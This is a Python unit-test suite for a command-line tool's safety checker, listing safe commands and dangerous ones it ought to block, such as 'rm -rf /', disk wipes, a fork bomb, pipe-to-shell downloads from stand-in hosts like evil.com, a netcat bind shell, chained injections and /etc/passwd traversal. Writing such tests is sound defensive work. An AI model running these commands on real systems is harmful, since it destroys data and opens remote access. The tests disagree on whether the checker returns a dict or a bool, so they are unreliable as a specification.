"""
Comprehensive test coverage for Safety Checker module (currently 0% coverage)
Critical security module - must have thorough testing
"""

import unittest
from unittest.mock import Mock, patch, MagicMock
from nlcli.safety_checker import SafetyChecker


class TestSafetyCheckerComprehensive(unittest.TestCase):
    """Comprehensive test cases for SafetyChecker"""
    
    def setUp(self):
        """Set up test fixtures"""
        self.safety_checker = SafetyChecker()
    
    def test_initialization(self):
        """Test SafetyChecker initialization"""
        checker = SafetyChecker()
        self.assertIsNotNone(checker)
    
    def test_is_safe_basic_commands(self):
        """Test safety check for basic safe commands"""
        safe_commands = [
            'ls -la',
            'pwd',
            'whoami',
            'date',
            'echo hello',
            'cat file.txt',
            'grep pattern file.txt',
            'find . -name "*.py"',
            'ps aux',
            'df -h',
            'top',
            'htop',
            'history'
        ]
        
        for cmd in safe_commands:
            with self.subTest(command=cmd):
                result = self.safety_checker.check_command(cmd)
                self.assertTrue(result, f"Command '{cmd}' should be safe")
    
    def test_is_safe_dangerous_commands(self):
        """Test safety check for dangerous commands"""
        dangerous_commands = [
            'rm -rf /',
            'rm -rf *',
            'rm -rf .*',
            'sudo rm -rf /',
            'rm -rf /home',
            'rm -rf /usr',
            'rm -rf /var',
            'rm -rf /etc',
            'dd if=/dev/zero of=/dev/sda',
            'mkfs.ext4 /dev/sda',
            'format c:',
            'del /s /q c:\\*',
            'sudo chmod 777 /',
            'chmod -R 777 /',
            ':(){ :|:& };:',  # Fork bomb
            'sudo systemctl stop networking',
            'sudo iptables -F',
            'curl malicious-site.com | bash',
            'wget evil.com/script | sh'
        ]
        
        for cmd in dangerous_commands:
            with self.subTest(command=cmd):
                result = self.safety_checker.check_command(cmd)
                self.assertFalse(result, f"Command '{cmd}' should be dangerous")
    
    def test_check_command_basic(self):
        """Test basic command checking"""
        # Safe command
        result = self.safety_checker.check_command('ls -la')
        self.assertIsInstance(result, dict)
        self.assertIn('safe', result)
        self.assertTrue(result['safe'])
        
        # Dangerous command
        result = self.safety_checker.check_command('rm -rf /')
        self.assertIsInstance(result, dict)
        self.assertIn('safe', result)
        self.assertFalse(result['safe'])
    
    def test_check_command_with_explanation(self):
        """Test command checking with safety explanation"""
        result = self.safety_checker.check_command('rm -rf /')
        self.assertIn('reason', result)
        self.assertIn('severity', result)
        self.assertEqual(result['severity'], 'critical')
    
    def test_file_operations_safety(self):
        """Test safety of various file operations"""
        safe_file_ops = [
            'touch newfile.txt',
            'mkdir new_directory',
            'cp file1.txt file2.txt',
            'mv file1.txt backup/',
            'chmod +x script.sh',
            'chown user:group file.txt'
        ]
        
        for cmd in safe_file_ops:
            with self.subTest(command=cmd):
                result = self.safety_checker.check_command(cmd)
                self.assertTrue(result, f"File operation '{cmd}' should be safe")
    
    def test_dangerous_file_operations(self):
        """Test detection of dangerous file operations"""
        dangerous_file_ops = [
            'rm -rf /',
            'rm -rf *',
            'rm -rf .*',
            'rm -rf /home/*',
            'rm -rf /etc/*',
            'sudo rm -rf /var',
            'find / -delete',
            'find . -exec rm {} \\;'
        ]
        
        for cmd in dangerous_file_ops:
            with self.subTest(command=cmd):
                result = self.safety_checker.check_command(cmd)
                self.assertFalse(result, f"Dangerous file operation '{cmd}' should be blocked")
    
    def test_system_modification_commands(self):
        """Test safety check for system modification commands"""
        dangerous_system_ops = [
            'sudo reboot',
            'sudo shutdown -h now',
            'sudo init 0',
            'sudo systemctl stop sshd',
            'sudo service networking stop',
            'sudo iptables -F',
            'sudo ufw disable',
            'sudo passwd root',
            'sudo userdel -r username'
        ]
        
        for cmd in dangerous_system_ops:
            with self.subTest(command=cmd):
                result = self.safety_checker.check_command(cmd)
                self.assertFalse(result, f"System modification '{cmd}' should be dangerous")
    
    def test_network_security_commands(self):
        """Test safety of network-related commands"""
        safe_network_cmds = [
            'ping google.com',
            'wget https://example.com/file.txt',
            'curl -s https://api.github.com',
            'ssh user@server.com',
            'scp file.txt user@server:/path/'
        ]
        
        dangerous_network_cmds = [
            'curl malicious.com | bash',
            'wget evil.com/script | sh',
            'nc -l -p 1234 -e /bin/bash',
            'python -m http.server 80'
        ]
        
        for cmd in safe_network_cmds:
            with self.subTest(command=cmd):
                result = self.safety_checker.check_command(cmd)
                self.assertTrue(result, f"Network command '{cmd}' should be safe")
        
        for cmd in dangerous_network_cmds:
            with self.subTest(command=cmd):
                result = self.safety_checker.check_command(cmd)
                self.assertFalse(result, f"Dangerous network command '{cmd}' should be blocked")
    
    def test_package_management_safety(self):
        """Test safety of package management commands"""
        safe_package_cmds = [
            'apt list --installed',
            'pip list',
            'npm list',
            'brew list',
            'yum list installed'
        ]
        
        potentially_dangerous_package_cmds = [
            'sudo apt update',
            'sudo apt upgrade',
            'pip install package',
            'npm install -g package',
            'sudo yum update'
        ]
        
        for cmd in safe_package_cmds:
            with self.subTest(command=cmd):
                result = self.safety_checker.check_command(cmd)
                self.assertTrue(result, f"Package list command '{cmd}' should be safe")
    
    def test_development_commands_safety(self):
        """Test safety of common development commands"""
        safe_dev_cmds = [
            'git status',
            'git log',
            'git diff',
            'git branch',
            'docker ps',
            'docker images',
            'kubectl get pods',
            'python manage.py runserver',
            'npm start',
            'yarn dev',
            'make build'
        ]
        
        for cmd in safe_dev_cmds:
            with self.subTest(command=cmd):
                result = self.safety_checker.check_command(cmd)
                self.assertTrue(result, f"Development command '{cmd}' should be safe")
    
    def test_edge_cases(self):
        """Test edge cases and malformed commands"""
        edge_cases = [
            '',  # Empty command
            '   ',  # Whitespace only
            'ls;rm -rf /',  # Command chaining
            'ls && rm -rf /',  # Command chaining with &&
            'ls || rm -rf /',  # Command chaining with ||
            'ls | rm -rf /',  # Piped dangerous command
            'echo "rm -rf /"',  # Quoted dangerous command
        ]
        
        # Empty/whitespace should be safe
        self.assertTrue(self.safety_checker.check_command(''))
        self.assertTrue(self.safety_checker.check_command('   '))
        
        # Command chaining with dangerous commands should be unsafe
        dangerous_chains = [
            'ls;rm -rf /',
            'ls && rm -rf /',
            'ls || rm -rf /',
        ]
        
        for cmd in dangerous_chains:
            with self.subTest(command=cmd):
                result = self.safety_checker.check_command(cmd)
                self.assertFalse(result, f"Dangerous command chain '{cmd}' should be blocked")
    
    def test_case_sensitivity(self):
        """Test case sensitivity in safety checking"""
        dangerous_variants = [
            'RM -RF /',
            'Rm -Rf /',
            'rm -RF /',
            'RM -rf /'
        ]
        
        for cmd in dangerous_variants:
            with self.subTest(command=cmd):
                result = self.safety_checker.check_command(cmd)
                self.assertFalse(result, f"Case variant '{cmd}' should be dangerous")
    
    def test_path_traversal_safety(self):
        """Test safety checks for path traversal patterns"""
        safe_paths = [
            'ls /home/user/documents',
            'cat ./config.txt',
            'cd ~/projects'
        ]
        
        dangerous_paths = [
            'cat ../../../../etc/passwd',
            'ls ../../../..',
            'rm -rf ../..',
            'find ../../.. -name "*.conf"'
        ]
        
        for cmd in safe_paths:
            with self.subTest(command=cmd):
                result = self.safety_checker.check_command(cmd)
                self.assertTrue(result, f"Safe path command '{cmd}' should be allowed")
    
    def test_severity_levels(self):
        """Test different severity levels of dangerous commands"""
        high_severity_cmds = [
            'rm -rf /',
            'dd if=/dev/zero of=/dev/sda',
            'format c:'
        ]
        
        medium_severity_cmds = [
            'sudo reboot',
            'sudo systemctl stop networking'
        ]
        
        for cmd in high_severity_cmds:
            with self.subTest(command=cmd):
                result = self.safety_checker.check_command(cmd)
                self.assertEqual(result.get('severity'), 'critical')
        
        for cmd in medium_severity_cmds:
            with self.subTest(command=cmd):
                result = self.safety_checker.check_command(cmd)
                self.assertIn(result.get('severity'), ['high', 'critical'])
    
    def test_whitelist_functionality(self):
        """Test whitelist functionality if implemented"""
        # Test that whitelisted commands are allowed even if they might seem dangerous
        with patch.object(self.safety_checker, '_is_whitelisted', return_value=True):
            result = self.safety_checker.check_command('custom_dangerous_command')
            self.assertTrue(result.get('safe', False))
    
    def test_configuration_integration(self):
        """Test integration with configuration system"""
        # Test that safety level configuration affects behavior
        with patch.object(self.safety_checker, '_get_safety_level', return_value='strict'):
            result = self.safety_checker.check_command('sudo apt update')
            # In strict mode, even package updates might be blocked
            self.assertIsInstance(result, bool)
        
        with patch.object(self.safety_checker, '_get_safety_level', return_value='permissive'):
            result = self.safety_checker.check_command('sudo apt update')
            # In permissive mode, package updates should be allowed
            self.assertIsInstance(result, bool)
    
    def test_error_handling(self):
        """Test error handling in safety checker"""
        # Test with None input
        try:
            result = self.safety_checker.check_command(None)
            self.assertTrue(result.get('safe', False))  # None should be safe (no command)
        except Exception:
            pass  # Some implementations might raise exceptions
        
        # Test with non-string input
        try:
            result = self.safety_checker.check_command(123)
            self.assertIsInstance(result, bool)
        except Exception:
            pass  # Some implementations might raise exceptions


if __name__ == '__main__':
    unittest.main()